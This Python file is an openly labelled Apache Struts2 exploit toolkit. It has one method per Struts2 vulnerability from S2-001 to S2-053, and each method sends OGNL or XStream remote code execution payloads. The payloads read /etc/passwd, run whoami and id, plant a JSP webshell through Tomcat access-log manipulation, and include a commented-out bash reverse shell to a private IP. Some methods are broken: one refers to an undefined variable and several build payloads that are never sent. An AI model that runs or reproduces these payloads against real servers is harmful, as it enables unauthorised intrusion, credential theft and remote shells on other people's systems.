# !/usr/bin/env python
# coding  : utf-8
# Date    : 2018-03-30 11:27:24
# Author  : b4zinga
# Email   : b4zinga@outlook.com
# Function: struts2 exploit

import requests
from urllib import parse


class Struts2:
    def __init__(self, url):
        """init"""
        if not 'http' in url:
            url = 'http://' + url
        self.url = url.strip('/')

    def s2001(self):
        """remote code execution"""

        # 获取tomcat执行路径
        payload_getTomcat_exec_path = '%{"tomcatBinDir{"+@java.lang.System@getProperty("user.dir")+"}"}'
        # 获取Web路径
        payload_getWeb_path = """%{#req=@org.apache.struts2.ServletActionContext@getRequest(),#response=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse").getWriter(),#response.println(#req.getRealPath('/')),#response.flush(),#response.close()}"""
        # 执行任意命令
        payload_exec_cmd = '%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{"pwd"})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}'
        # 执行任意命令（命令加参数：new java.lang.String[]{"cat","/etc/passwd"}）：
        payload_exec_cmds = '%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{"cat","/etc/passwd"})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}'

        data = {
            'username': payload_exec_cmds,
            'password': payload_exec_cmd,
        }

        req = requests.post(url=self.url, data=data)
        print(req.text)

    def s2005(self):
        """version < Struts 2.2.1
        remote code execution
        无回显
        CVE-2010-1870"""
        payload = """/example/HelloWorld.action?(%27%5cu0023_memberAccess[%5c%27allowStaticMethodAccess%5c%27]%27)(vaaa)=true&(aaaa)((%27%5cu0023context[%5c%27xwork.MethodAccessor.denyMethodExecution%5c%27]%5cu003d%5cu0023vccc%27)(%5cu0023vccc%5cu003dnew%20java.lang.Boolean(%22false%22)))&(asdf)(('%5cu0023rt.exec(%22touch@/tmp/success%22.split(%22@%22))')(%5cu0023rt%5cu003d@java.lang.Runtime@getRuntime()))=1"""

        req = requests.get(url=self.url+payload)
        if req.text:
            print('[+] s2-005 success ')
        else:
            print(req.text)

    def s2007(self):
        """Version : Struts2 2.0.0 - Struts2 2.2.3
        remote code execution
        在输入框使用payload"""
        payload = """' + (#_memberAccess["allowStaticMethodAccess"]=true,#foo=new java.lang.Boolean("false") ,#context["xwork.MethodAccessor.denyMethodExecution"]=#foo,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('id').getInputStream())) + '"""
        data = {'age': payload,
                'email': 'asd@qq.com',
                'name': 'asd'}
        req = requests.post(url=self.url, data=data)
        if 'uid' in req.text:
            print('[+] s2-007 success ')
        print(req.text)

    def s2009(self):
        """Version: 2.1.0 - 2.3.1.1
        remote code execution
        无回显
        CVE-2011-3923"""
        # eg: http://192.168.1.129:8080/ajax/example5.action
        payload = """?age=12313&name=%28%23context[%22xwork.MethodAccessor.denyMethodExecution%22]%3D+new+java.lang.Boolean%28false%29,%20%23_memberAccess[%22allowStaticMethodAccess%22]%3d+new+java.lang.Boolean%28true%29,%20@java.lang.Runtime@getRuntime%28%29.exec%28%27touch%20/tmp/success%27%29%29%28meh%29&z[%28name%29%28%27meh%27%29]=true"""
        req = requests.get(self.url.replace('.action', '') + payload)
        if 'touch' in req.text:
            print('[+] s2-009 success ')
        print(req.text)

    def s2012(self):
        """Version: 2.1.0 - 2.3.13
        remote code execution
        """
        payload = '%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{"cat", "/etc/passwd"})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}'

        data = {'name': payload}
        req = requests.post(self.url, data=data)
        print(req.text)

    def s2013(self):
        """Version: 2.0.0 - 2.3.14.1
        remote code execution
        CVE-2013-1966"""
        payload = """?a=%24%7B%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23a%3D%40java.lang.Runtime%40getRuntime().exec('id').getInputStream()%2C%23b%3Dnew%20java.io.InputStreamReader(%23a)%2C%23c%3Dnew%20java.io.BufferedReader(%23b)%2C%23d%3Dnew%20char%5B50000%5D%2C%23c.read(%23d)%2C%23out%3D%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2C%23out.println('dbapp%3D'%2Bnew%20java.lang.String(%23d))%2C%23out.close()%7D"""
        req = requests.get(self.url+payload)
        print(req.text)

    def s2014(self):
        """"""
        payload = """link.action?xxxx=%24%7B%28%23context%5B%27xwork.MethodAccessor.denyMethodExecution%27%5D%3Dfalse%29%28%23_memberAccess%5B%27allowStaticMethodAccess%27%5D%3Dtrue%29%28@java.lang.Runtime@getRuntime%28%29.exec%28%22open%20%2fApplications%2fCalculator.app%22%29%29%7D"""
        return self.s2013()

    def s2015(self):
        """Version: 2.0.0 - 2.3.14.2
        remote code execution"""
        payload = """%24%7B%23context%5B%27xwork.MethodAccessor.denyMethodExecution%27%5D%3Dfalse%2C%23m%3D%23_memberAccess.getClass%28%29.getDeclaredField%28%27allowStaticMethodAccess%27%29%2C%23m.setAccessible%28true%29%2C%23m.set%28%23_memberAccess%2Ctrue%29%2C%23q%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%27"""
        payload += "id"
        payload += """%27%29.getInputStream%28%29%29%2C%23q%7D.action"""
        req = requests.get(self.url+payload)

        print(parse.unquote(req.text))

    def s2016(self):
        """Version: 2.0.0 - 2.3.15
        remote code execution
        CVE-2013-2251"""
        payload_exec_cmd = '${#context["xwork.MethodAccessor.denyMethodExecution"]=false,#f=#_memberAccess.getClass().getDeclaredField("allowStaticMethodAccess"),#f.setAccessible(true),#f.set(#_memberAccess,true),#a=@java.lang.Runtime@getRuntime().exec("uname -a").getInputStream(),#b=new java.io.InputStreamReader(#a),#c=new java.io.BufferedReader(#b),#d=new char[5000],#c.read(#d),#genxor=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse").getWriter(),#genxor.println(#d),#genxor.flush(),#genxor.close()}'
        payload_get_web_path = """${#req=#context.get('co'+'m.open'+'symphony.xwo'+'rk2.disp'+'atcher.HttpSer'+'vletReq'+'uest'),#resp=#context.get('co'+'m.open'+'symphony.xwo'+'rk2.disp'+'atcher.HttpSer'+'vletRes'+'ponse'),#resp.setCharacterEncoding('UTF-8'),#ot=#resp.getWriter (),#ot.print('web'),#ot.print('path:'),#ot.print(#req.getSession().getServletContext().getRealPath('/')),#ot.flush(),#ot.close()}"""

        req = requests.get(self.url+'?redirect:'+parse.quote(payload_webshell))

        print(req.text)

    def s2019(self):
        """Version: Struts 2.0.0 – Struts 2.3.15.1
        CVE-2013-4316"""
        payload = """debug=command&expression=#f=#_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess'),#f.setAccessible(true),#f.set(#_memberAccess,true),#req=@org.apache.struts2.ServletActionContext@getRequest(),#resp=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#a=(new java.lang.ProcessBuilder(new java.lang.String[]{'aaaaaaaaaaaaaaaaaaa'})).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[10000],#d.read(#e),#resp.println(#e),#resp.close()"""


    def s2020(self):
        """Version: 2.0.0 - 2.3.16
        CVE-2014-0094"""
        # 更改属性
        payload1 = "?class.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT"
        payload2 = "?class.classLoader.resources.context.parent.pipeline.first.prefix=shell"
        payload3 = "?class.classLoader.resources.context.parent.pipeline.first.suffix=.jsp"

        # 触发tomcat切换log    从此开始tomcat的access log将被记录入 webapps/ROOT/shell1.jsp中
        payload4 = "?class.classLoader.resources.context.parent.pipeline.first.fileDateFormat=1"

        # 访问在access log 中插入代码
        payload5 = '/aaaa.jsp?a=<%Runtime.getRuntime().exec("calc");%>'




    def s2032(self):
        """Version: 2.3.18 - 2.3.28
        CVE-2016-3081"""
        payload = """?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding%5B0%5D),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd%5B0%5D).getInputStream()).useDelimiter(%23parameters.pp%5B0%5D),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp%5B0%5D,%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&cmd=aaaaaaaaaaaaaaaaaaa&pp=%5C%5CA&ppp=%20&encoding=UTF-8"""



    def s2037(self):
        """Version: 2.3.20 - 2.3.28.1
        CVE-2016-4438"""
        payload = """/(%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23wr%3d%23context%5b%23parameters.obj%5b0%5d%5d.getWriter(),%23rs%3d@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command%5B0%5D).getInputStream()),%23wr.println(%23rs),%23wr.flush(),%23wr.close()):xx.toString.json?&obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=7556&command=aaaaaaaaaaaaaaaaaaa"""

        # dev mode
        payload = """?debug=browser&object=(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)?(#context[#parameters.rpsobj[0]].getWriter().println(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(#parameters.command[0]).getInputStream()))):sb.toString.json&rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&command=aaaaaaaaaaaaaaaaaaa"""



    def s2045(self):
        """Version: 2.3.5 – 2.3.31 , 2.5 – 2.5.10
        remote code execution
        CVE-2017-5638"""
        header = dict()
        header['Content-Type'] = "%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"

        req = requests.get(self.url, headers=header)

        print(req.text)

    def s2046(self):
        """Version: 2 2.3.x < 2.3.32, 2.5.x < 2.5.10.1
        CVE-2017-5638"""
        """
        #!/bin/bash

        url=$1
        cmd=$2
        shift
        shift

        boundary="---------------------------735323031399963166993862150"
        content_type="multipart/form-data; boundary=$boundary"
        payload=$(echo "%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='"$cmd"').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}")

        printf -- "--$boundary\r\nContent-Disposition: form-data; name=\"foo\"; filename=\"%s\0b\"\r\nContent-Type: text/plain\r\n\r\nx\r\n--$boundary--\r\n\r\n" "$payload" | curl "$url" -H "Content-Type: $content_type" -H "Expect: " -H "Connection: close" --data-binary @- $@
        """
        pass


    def s2048(self):
        """Version: 2.0.0 - 2.3.32
        remote code execution
        CVE-2017-9791"""

        payload = "%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
        data = {
            '__checkbox_bustedBefore': 'true',
            'age': 'ss',
            'description': 'as',
            'name': payload,
        }

        req = requests.post(url=self.url, data=data)
        print(req.text)

    def s2052(self):
        """Version:  2.1.2-2.3.33, 2.5-2.5.12
        remote code execution
        无回显
        CVE-2017-9805"""
        payload = '<map> <entry> <jdk.nashorn.internal.objects.NativeString> <flags>0</flags> <value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data"> <dataHandler> <dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource"> <is class="javax.crypto.CipherInputStream"> <cipher class="javax.crypto.NullCipher"> <initialized>false</initialized> <opmode>0</opmode> <serviceIterator class="javax.imageio.spi.FilterIterator"> <iter class="javax.imageio.spi.FilterIterator"> <iter class="java.util.Collections$EmptyIterator"/> <next class="java.lang.ProcessBuilder"> <command> '
        payload += '<string>touch</string> <string>/tmp/success</string>'
        payload += ' </command> <redirectErrorStream>false</redirectErrorStream> </next> </iter> <filter class="javax.imageio.ImageIO$ContainsFilter"> <method> <class>java.lang.ProcessBuilder</class> <name>start</name> <parameter-types/> </method> <name>foo</name> </filter> <next class="string">foo</next> </serviceIterator> <lock/> </cipher> <input class="java.lang.ProcessBuilder$NullInputStream"/> <ibuffer></ibuffer> <done>false</done> <ostart>0</ostart> <ofinish>0</ofinish> <closed>false</closed> </is> <consumed>false</consumed> </dataSource> <transferFlavors/> </dataHandler> <dataLen>0</dataLen> </value> </jdk.nashorn.internal.objects.NativeString> <jdk.nashorn.internal.objects.NativeString reference="../jdk.nashorn.internal.objects.NativeString"/> </entry> <entry> <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/> </entry> </map>'

        headers = {'User-Agent': 'Mozilla/5.0',
                   'Content-Type': 'application/xml'}

        req = requests.post(self.url, headers=headers, data=payload)
        if req.status_code == 500:
            print('[+] s2-052 success ')

    def s2053(self):
        """Version: 2.0.1/2.3.33/2.5-2.5.10
        remote code execution"""
        payload = """%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='"""
        payload += 'cat /etc/passwd'
        # payload += 'bash -i >& /dev/tcp/192.168.1.133/4444 0>&1'
        payload += """').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))}\n"""
        headers = {
            'redirectUri':payload
        }

        req = requests.post(self.url, data=headers)

        if 'root' in req.text:
            print('[+] s2-053 success ')
        print(req.text)


if __name__ == '__main__':
    url = 'http://192.168.1.129:8080/hello.action'
    st = Struts2(url)
    print(help(st))
